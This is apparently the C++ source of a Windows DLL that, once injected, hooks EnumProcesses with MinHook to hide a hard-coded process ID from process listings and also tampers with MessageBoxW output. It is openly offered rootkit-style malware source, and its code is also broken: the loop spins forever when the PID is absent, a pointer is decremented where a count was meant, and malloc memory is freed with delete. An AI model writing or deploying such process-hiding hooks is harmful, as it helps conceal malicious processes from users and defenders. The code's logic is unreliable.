#include "stdafx.h"
#include <Windows.h>
#include "MinHook.h"
#include <psapi.h>
#include <strstream>

using namespace std;

// EnumProcesses hooking variables
typedef BOOL(WINAPI *ENUMPROCESSES)(DWORD*, DWORD, DWORD*);
ENUMPROCESSES fpEnumProcesses = NULL;
BOOL WINAPI DetourEnumProcesses(DWORD* pProcessIds, DWORD cb, DWORD* pBytesReturned) {

	// Get processes
	int retValue = fpEnumProcesses(pProcessIds, cb, pBytesReturned);

	// Find bad index
	unsigned long procSz = *pBytesReturned / sizeof(DWORD);
	char* num = (char*)malloc(sizeof(char)*16);
	char* procName = (char*)malloc(sizeof(char)* 256);
	bool clean = false;
	int badIndex = -1;
	int nextIndex = 0;
	do {
		badIndex = -1;
		for (unsigned long i = nextIndex; i < procSz; i++) {

			// Get process name
			//HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pProcessIds[i]);
			//GetProcessImageFileName(procHandle, procName, 256);

			// Compare
			//if (strstr(procName, "chrome.exe") != NULL) {
			// Replace "1564" with the PID of the process you wish to hide
			if (pProcessIds[i] == 1564) {
				badIndex = i;
				nextIndex = i;
				break;
			}
		}
		
		// Shift everything over (if bad index found)
		if (badIndex != -1) {
			for (unsigned long j = badIndex + 1; j < procSz; j++) {
				pProcessIds[j - 1] = pProcessIds[j];
			}
			pProcessIds[(unsigned long)(procSz)-1] = 0;
			pBytesReturned -= sizeof(DWORD);
		}
	} while (badIndex == -1);

	// Clean up
	delete procName;
	delete num;

	// Done!
	return true;
}

typedef int (WINAPI *MESSAGEBOXW)(HWND, LPCWSTR, LPCWSTR, UINT);
MESSAGEBOXW fpMessageBoxW = NULL;
int WINAPI DetourMessageBoxW(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) {
	return fpMessageBoxW(hWnd, L"Nope...", L"Spoy", uType);
}

void messageNum(int n) {
	switch (n) {
		case 1:
			MessageBoxW(NULL, L"MH_ERROR_ALREADY_INITIALIZED", L"Fail!", 0);
			break;
		case 2:
			MessageBoxW(NULL, L"MH_ERROR_NOT_INITIALIZED", L"Fail!", 0);
			break;
		case 3:
			MessageBoxW(NULL, L"MH_ERROR_ALREADY_CREATED", L"Fail!", 0);
			break;
		case 4:
			MessageBoxW(NULL, L"MH_ERROR_NOT_CREATED", L"Fail!", 0);
			break;
		case 5:
			MessageBoxW(NULL, L"MH_ERROR_ENABLED", L"Fail!", 0);
			break;
		case 6:
			MessageBoxW(NULL, L"MH_ERROR_DISABLED", L"Fail!", 0);
			break;
		case 7:
			MessageBoxW(NULL, L"MH_ERROR_NOT_EXECUTABLE", L"Fail!", 0);
			break;
		case 8:
			MessageBoxW(NULL, L"MH_ERROR_UNSUPPORTED_FUNCTION", L"Fail!", 0);
			break;
		case 9:
			MessageBoxW(NULL, L"MH_ERROR_MEMORY_ALLOC", L"Fail!", 0);
			break;
		case 10:
			MessageBoxW(NULL, L"MH_ERROR_MEMORY_PROTECT", L"Fail!", 0);
			break;
		case 11:
			MessageBoxW(NULL, L"MH_ERROR_MODULE_NOT_FOUND", L"Fail!", 0);
			break;
		case 12:
			MessageBoxW(NULL, L"MH_ERROR_FUNCTION_NOT_FOUND", L"Fail!", 0);
			break;
	}

	// Done
	return;
}

// Hook shit
void DoBadThings() {

	int baz = MH_Initialize();
	messageNum(baz);
	baz = MH_CreateHookApi(L"kernel32", "K32EnumProcesses", &DetourEnumProcesses, reinterpret_cast<LPVOID*>(&fpEnumProcesses));
	messageNum(baz);
	baz = MH_CreateHookApi(L"psapi", "EnumProcesses", &DetourEnumProcesses, reinterpret_cast<LPVOID*>(&fpEnumProcesses));
	messageNum(baz);
	baz = MH_EnableHook(NULL);

	// Done!
	return;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
		case DLL_PROCESS_ATTACH:
			MessageBoxA(NULL, "PROC ATTCH!", "Spoy", 0);
			DoBadThings();
			break;
		case DLL_THREAD_ATTACH:
			MessageBoxA(NULL, "THRD ATTCH!", "Spoy", 0);
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			MH_Uninitialize();
			break;
	}
	return true;
}
